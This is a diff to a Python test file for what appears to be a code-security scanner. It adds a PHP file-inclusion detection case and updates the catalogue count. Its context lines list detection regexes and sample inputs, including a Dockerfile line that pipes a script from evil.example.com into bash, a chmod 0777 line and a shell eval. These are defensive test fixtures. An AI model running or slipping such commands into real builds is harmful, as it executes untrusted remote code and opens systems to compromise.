@@ -423,6 +423,7 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("import", "blade", r"@(?:extends|include(?:First|Unless|When|If)?|component|each)\s*\([^\r\n)]*", "import", BLADE_IMPORT_SRC, "x.blade.php", "@extends('layouts.app')", None),
     ("import", "blade", r"<(?:script|link|iframe)\b[^>]*(?:src|href)\s*=\s*['\"]?[^'\"\s>]+", "import", BLADE_IMPORT_SRC, "x.blade.php", '<script src="app.js">', None),
     # ========================== extra sinks =================================
+    ("extra_sink", "php", treesitter_streaming._PHP_STREAM_INCLUDE, "extra_sink", PHP_IMPORT_SRC, "x.php", "require 'c.php';", "file_inclusion"),
     ("extra_sink", "dockerfile", r"\b(?:curl|wget)\b[^\r\n|;]*\|\s*(?:sh|bash|zsh)\b", "extra_sink", DOCKERFILE_SINK_SRC, "Dockerfile", "RUN curl https://evil.example.com/x.sh | bash", "remote_pipe_to_shell"),
     ("extra_sink", "dockerfile", r"\bchmod\s+(?:-R\s+)?[0-7]*777\b", "extra_sink", DOCKERFILE_SINK_SRC, "Dockerfile", "RUN chmod -R 0777 /app", "permissive_chmod"),
     ("extra_sink", "shell", r"\beval\b", "extra_sink", SHELL_SINK_SRC, "x.sh", 'eval "$cmd"', "shell_eval"),
@@ -734,9 +735,9 @@ def test_catalogue_sweep_covers_every_streaming_pattern() -> None:
         | _real_extra_sink_keys()
         | _real_extra_entry_keys()
     )
-    assert len(real_keys) == 100, (
-        f"expected 100 streaming catalogue entries (40 sources + 23 imports + "
-        f"25 extra sinks + 12 extra entry points), found {len(real_keys)}. The catalogue "
+    assert len(real_keys) == 101, (
+        f"expected 101 streaming catalogue entries (40 sources + 23 imports + "
+        f"26 extra sinks + 12 extra entry points), found {len(real_keys)}. The catalogue "
         f"has drifted since this audit; update LIVE_CASES/OBSOLETE_PATTERNS."
     )
 
